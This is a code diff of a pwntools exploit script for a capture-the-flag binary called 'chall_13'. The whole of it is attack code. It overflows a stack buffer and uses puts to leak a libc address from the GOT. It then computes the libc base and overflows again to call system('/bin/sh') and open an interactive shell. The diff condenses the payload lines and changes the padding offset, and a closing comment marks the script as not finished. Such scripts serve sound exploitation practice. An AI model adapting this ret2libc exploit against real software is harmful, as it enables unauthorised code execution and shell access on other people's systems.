@@ -1,18 +1,10 @@
 from pwn import *
-
 binary = context.binary = ELF('./chall_13')
+p = process(binary.path)
 
-p = process('./chall_13')
-
-payload  = 0x3e * b'A'
-payload += p32(binary.plt.puts)
-payload += p32(binary.sym.vuln)
-payload += p32(binary.got.puts)
-
-p.sendline(payload)
+p.sendline((0x10c - 0x4) * b'A' + p32(binary.plt.puts) + p32(binary.sym.vuln) + p32(binary.got.puts))
 _ = p.recv(4)
 puts = u32(_)
-log.info('puts: ' + hex(puts))
 p.recv(20)
 
 if not 'libc' in locals():
@@ -33,11 +25,6 @@ if not 'libc' in locals():
 libc.address = puts - libc.sym.puts
 log.info('libc.address: ' + hex(libc.address))
 
-payload  = 0x3e * b'A'
-payload += p32(libc.sym.system)
-payload += 4 * b'B'
-payload += p32(libc.search(b'/bin/sh').__next__())
-
-p.sendline(payload)
+p.sendline((0x10c - 0x4) * b'A' + p32(libc.sym.system) + 4 * b'B' + p32(libc.search(b'/bin/sh').__next__()))
 p.interactive()
 # NOT FINISHED
